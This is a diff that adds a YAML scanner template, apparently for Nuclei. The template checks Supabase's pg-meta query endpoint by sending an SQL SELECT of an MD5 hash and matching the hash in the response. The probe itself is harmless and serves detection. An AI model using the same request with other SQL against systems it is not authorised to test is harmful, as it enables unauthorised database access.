@@ -1,0 +1,28 @@
+id: poc-yaml-supabase-query-sqli
+info:
+  name: Supabase SQL Injection in Query Endpoint
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Identifies a potential SQL Injection vulnerability in the Supabase platform's query API endpoint.
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: POST
+    path:
+      - "/api/pg-meta/default/query"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"query":"SELECT MD5('{{t1}}');"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
